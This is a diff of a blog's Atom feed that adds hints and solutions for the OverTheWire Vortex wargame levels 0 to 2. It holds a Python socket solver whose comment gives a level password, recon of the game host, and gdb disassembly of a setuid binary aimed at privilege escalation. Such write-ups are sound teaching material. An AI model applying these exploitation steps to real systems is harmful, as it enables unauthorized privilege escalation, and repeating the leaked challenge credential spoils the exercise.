@@ -4,7 +4,7 @@
   <title><![CDATA[David Xia]]></title>
   <link href="https://www.davidxia.com/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-12-26T09:36:36-05:00</updated>
+  <updated>2020-12-26T16:52:12-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -14,23 +14,40 @@
 
   
   <entry>
-    <title type="html"><![CDATA[My Solution to Over the Wire Vortex Level 1 -> 2]]></title>
-    <link href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/"/>
+    <title type="html"><![CDATA[My Hints and Solutions to the First Three Levels of Over the Wire Vortex]]></title>
+    <link href="https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex/"/>
     <updated>2020-12-25T20:21:28-05:00</updated>
-    <id>https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2</id>
-    <content type="html"><![CDATA[<p>I recently found a whole new series of online wargames at <a href="https://overthewire.org/">overthewire.org</a>.
-Here&rsquo;s my solution for the second level &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a>&rdquo;</p>
+    <id>https://www.davidxia.com/2020/12/my-hints-and-solutions-to-the-first-three-levels-of-over-the-wire-vortex</id>
+    <content type="html"><![CDATA[<p>I recently found more wargames at <a href="https://overthewire.org/">overthewire.org</a>. Here are my hints and
+solutions for the first three levels of Vortex. The levels are cumulative. We
+have to beat the previous level in order to access the next.</p>
 
-<p>The levels are cumulative. We have to beat the previous level in order to access the next. This
-solution assumes we have solved &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a>&rdquo; and can SSH into the
-machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
+<h1><a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a></h1>
+
+<p><details>
+  <summary>Hint 1: how much data</summary>
+  Connect to the host and port and read all the bytes you can. How many bytes do you get?
+</details></p>
+
+<p><details>
+  <summary>Hint 2: endianess</summary>
+  &ldquo;&hellip;read in 4 unsigned integers in host byte order&rdquo; means the bytes are
+  already in host byte order or little-endian. If your system is also
+  little-endian, you don&rsquo;t need to do anything special when interpreting the
+  bytes.
+</details></p>
+
+<p><details>
+  <summary>Hint 3: expected reply</summary>
+  How many bytes is each integer? What is the sum of all four?
+</details></p>
 
 <!-- more -->
 
 
-<p>First let&rsquo;s find out some information about the machine.</p>
+<h2>My solution</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -50,47 +67,170 @@ machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
 <span class='line-number'>18</span>
 <span class='line-number'>19</span>
 <span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ssh vortex1@vortex.labs.overthewire.org -p 2228
-</span><span class='line'>                 _
-</span><span class='line'>__   _____  _ __| |_ _____  __
-</span><span class='line'>\ \ / / _ \| '__| __/ _ \ \/ /
-</span><span class='line'> \ V / (_) | |  | ||  __/&gt;  &lt;
-</span><span class='line'>  \_/ \___/|_|   \__\___/_/\_\
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python3</span>
 </span><span class='line'>
-</span><span class='line'>a http://www.overthewire.org wargame.
+</span><span class='line'><span class="c"># Example output</span>
+</span><span class='line'><span class="c"># got bytes 53 ac 40 65 d4 36 07 63 5b 74 dd 4b 0f b6 cc 4d</span>
+</span><span class='line'><span class="c"># sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is 5938220433</span>
+</span><span class='line'><span class="c"># replying with bytes 91 0d f2 61 01 00 00 00</span>
+</span><span class='line'><span class="c"># Username: vortex1 Password: Gq#qu3bF3</span>
 </span><span class='line'>
-</span><span class='line'>vortex1@vortex.labs.overthewire.org's password:
-</span><span class='line'>Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)
+</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
 </span><span class='line'>
-</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="s">&#39;vortex.labs.overthewire.org&#39;</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">5842</span>
 </span><span class='line'>
-</span><span class='line'>The programs included with the Ubuntu system are free software;
-</span><span class='line'>the exact distribution terms for each program are described in the
-</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
 </span><span class='line'>
-</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-</span><span class='line'>applicable law.</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;got bytes {r.hex(&quot; &quot;)}&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span><span class='line'><span class="c"># Since the machine is a 32-bit system, each integer will be four bytes.</span>
+</span><span class='line'><span class="c"># So we interpret each integer four bytes at a time.</span>
+</span><span class='line'><span class="n">int_a</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'><span class="n">int_b</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'><span class="n">int_c</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">12</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'><span class="n">int_d</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">ba</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">16</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Sum all the integers.</span>
+</span><span class='line'><span class="n">_sum</span> <span class="o">=</span> <span class="n">int_a</span> <span class="o">+</span> <span class="n">int_b</span> <span class="o">+</span> <span class="n">int_c</span> <span class="o">+</span> <span class="n">int_d</span>
+</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;sum of first four unsigned ints (16 bytes assuming each unsigned int is 4 bytes) is {_sum}&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Packing like this seems to take care of endianess by default</span>
+</span><span class='line'><span class="n">reply_bytes</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;Q&#39;</span><span class="p">,</span> <span class="n">_sum</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&#39;replying with bytes {reply_bytes.hex(&quot; &quot;)}&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">reply_bytes</span><span class="p">)</span>
+</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h1><a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a></h1>
+
+<p>This solution assumes we have solved the previous level and can SSH into the
+machine as user vortex1. Caveat: the machine is extremely slow.</p>
+
+<p>First let&rsquo;s find out some information about the machine.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="n">vortex1</span><span class="nd">@vortex.labs.overthewire.org</span> <span class="o">-</span><span class="n">p</span> <span class="mi">2228</span>
+</span><span class='line'>                 <span class="n">_</span>
+</span><span class='line'><span class="n">__</span>   <span class="n">_____</span>  <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_____</span>  <span class="n">__</span>
+</span><span class='line'>\ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \<span class="o">|</span> <span class="s">&#39;__| __/ _ \ \/ /</span>
+</span><span class='line'> \ <span class="n">V</span> <span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">||</span>  <span class="n">__</span><span class="o">/&gt;</span>  <span class="o">&lt;</span>
+</span><span class='line'>  \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>\<span class="n">_</span>\
+</span><span class='line'>
+</span><span class='line'><span class="n">a</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">overthewire</span><span class="o">.</span><span class="n">org</span> <span class="n">wargame</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">vortex1</span><span class="nd">@vortex.labs.overthewire.org</span><span class="s">&#39;s password:</span>
+</span><span class='line'><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">14.04</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">4.4</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">92</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'> <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">The</span> <span class="n">programs</span> <span class="n">included</span> <span class="k">with</span> <span class="n">the</span> <span class="n">Ubuntu</span> <span class="n">system</span> <span class="n">are</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span>
+</span><span class='line'><span class="n">the</span> <span class="n">exact</span> <span class="n">distribution</span> <span class="n">terms</span> <span class="k">for</span> <span class="n">each</span> <span class="n">program</span> <span class="n">are</span> <span class="n">described</span> <span class="ow">in</span> <span class="n">the</span>
+</span><span class='line'><span class="n">individual</span> <span class="n">files</span> <span class="ow">in</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Ubuntu</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span>
+</span><span class='line'><span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>It&rsquo;s a machine running Ubuntu 14.04.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ uname -i
-</span><span class='line'>x86_64</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">i</span>
+</span><span class='line'><span class="n">x86_64</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>It&rsquo;s a 64-bit system.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
-</span><span class='line'>0</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
+</span><span class='line'><span class="mi">0</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>ASLR is disabled.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<p><details>
+  <summary>Hint 1: password location for next level</summary>
+  The instructions don&rsquo;t tell you this, but the password for the next level is
+  located in the directory <code>/etc/vortex_pass</code>.
+</details></p>
+
+<p><details>
+  <summary>Hint 2: required permissions</summary>
+  What are the permissions of the password file for the next level? How can you
+  read this file?
+</details></p>
+
+<p><details>
+  <summary>Hint 3: program source code</summary>
+  What does the program do? Can you see the code path you need to execute to
+  elevate your privileges?
+</details></p>
+
+<p><details>
+  <summary>Hint 4: how to change <code>ptr</code></summary>
+  How can you change the value of <code>ptr</code> to the right value? You shouldn&rsquo;t need
+  to send more than ~300 bytes to the program to do so.
+</details></p>
+
+<h2>My solution</h2>
+
+<p>Let&rsquo;s disassemble the executable to gain some insight into the stack layout.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -182,101 +322,102 @@ machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
 <span class='line-number'>90</span>
 <span class='line-number'>91</span>
 <span class='line-number'>92</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ gdb /vortex/vortex1
-</span><span class='line'>GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
-</span><span class='line'>Copyright (C) 2014 Free Software Foundation, Inc.
-</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
-</span><span class='line'>This is free software: you are free to change and redistribute it.
-</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-</span><span class='line'>and "show warranty" for details.
-</span><span class='line'>This GDB was configured as "x86_64-linux-gnu".
-</span><span class='line'>Type "show configuration" for configuration details.
-</span><span class='line'>For bug reporting instructions, please see:
-</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
-</span><span class='line'>Find the GDB manual and other documentation resources online at:
-</span><span class='line'>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
-</span><span class='line'>For help, type "help".
-</span><span class='line'>Type "apropos word" to search for commands related to "word"...
-</span><span class='line'>Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">vortex1</span><span class="nd">@vortex</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span>
+</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="mf">7.7</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu5</span><span class="o">~</span><span class="mf">14.04</span><span class="o">.</span><span class="mi">3</span><span class="p">)</span> <span class="mf">7.7</span><span class="o">.</span><span class="mi">1</span>
+</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2014</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
+</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="ow">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="o">.</span><span class="n">html</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
+</span><span class='line'><span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
+</span><span class='line'><span class="ow">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
+</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="k">as</span> <span class="s">&quot;x86_64-linux-gnu&quot;</span><span class="o">.</span>
+</span><span class='line'><span class="n">Type</span> <span class="s">&quot;show configuration&quot;</span> <span class="k">for</span> <span class="n">configuration</span> <span class="n">details</span><span class="o">.</span>
+</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;.</span>
+</span><span class='line'><span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="ow">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">documentation</span><span class="o">/&gt;.</span>
+</span><span class='line'><span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="nb">type</span> <span class="s">&quot;help&quot;</span><span class="o">.</span>
+</span><span class='line'><span class="n">Type</span> <span class="s">&quot;apropos word&quot;</span> <span class="n">to</span> <span class="n">search</span> <span class="k">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s">&quot;word&quot;</span><span class="o">...</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">vortex</span><span class="o">/</span><span class="n">vortex1</span><span class="o">...</span><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
 </span><span class='line'>
-</span><span class='line'>(gdb) set disassembly-flavor intel
-</span><span class='line'>(gdb) set pagination off
-</span><span class='line'>(gdb) disassemble main
-</span><span class='line'>Dump of assembler code for function main:
-</span><span class='line'>   0x080485c0 &lt;+0&gt;: push   ebp
-</span><span class='line'>   0x080485c1 &lt;+1&gt;: mov    ebp,esp
-</span><span class='line'>   0x080485c3 &lt;+3&gt;: push   esi
-</span><span class='line'>   0x080485c4 &lt;+4&gt;: push   ebx
-</span><span class='line'>   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
-</span><span class='line'>   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
-</span><span class='line'>   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
-</span><span class='line'>   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
-</span><span class='line'>   0x080485db &lt;+27&gt;:    xor    eax,eax
-</span><span class='line'>   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
-</span><span class='line'>   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
-</span><span class='line'>   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
-</span><span class='line'>   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
-</span><span class='line'>   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
-</span><span class='line'>   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
-</span><span class='line'>   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
-</span><span class='line'>   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
-</span><span class='line'>   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
-</span><span class='line'>   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
-</span><span class='line'>   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
-</span><span class='line'>   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
-</span><span class='line'>   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
-</span><span class='line'>   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
-</span><span class='line'>   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
-</span><span class='line'>   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
-</span><span class='line'>   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
-</span><span class='line'>   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
-</span><span class='line'>   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
-</span><span class='line'>   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
-</span><span class='line'>   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
-</span><span class='line'>   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
-</span><span class='line'>   0x08048631 &lt;+113&gt;:   mov    esi,eax
-</span><span class='line'>   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
-</span><span class='line'>   0x08048638 &lt;+120&gt;:   mov    ebx,eax
-</span><span class='line'>   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
-</span><span class='line'>   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
-</span><span class='line'>   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
-</span><span class='line'>   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
-</span><span class='line'>   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
-</span><span class='line'>   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
-</span><span class='line'>   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
-</span><span class='line'>   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
-</span><span class='line'>   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
-</span><span class='line'>   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
-</span><span class='line'>   0x0804866f &lt;+175&gt;:   add    eax,0x200
-</span><span class='line'>   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
-</span><span class='line'>   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
-</span><span class='line'>   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
-</span><span class='line'>   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
-</span><span class='line'>   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
-</span><span class='line'>   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
-</span><span class='line'>   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
-</span><span class='line'>   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
-</span><span class='line'>   0x0804868d &lt;+205&gt;:   nop
-</span><span class='line'>   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
-</span><span class='line'>   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
-</span><span class='line'>   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
-</span><span class='line'>   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
-</span><span class='line'>   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
-</span><span class='line'>   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
-</span><span class='line'>   0x080486ae &lt;+238&gt;:   mov    eax,0x0
-</span><span class='line'>   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
-</span><span class='line'>   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
-</span><span class='line'>   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
-</span><span class='line'>   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
-</span><span class='line'>   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
-</span><span class='line'>   0x080486cb &lt;+267&gt;:   pop    ebx
-</span><span class='line'>   0x080486cc &lt;+268&gt;:   pop    esi
-</span><span class='line'>   0x080486cd &lt;+269&gt;:   pop    ebp
-</span><span class='line'>   0x080486ce &lt;+270&gt;:   ret
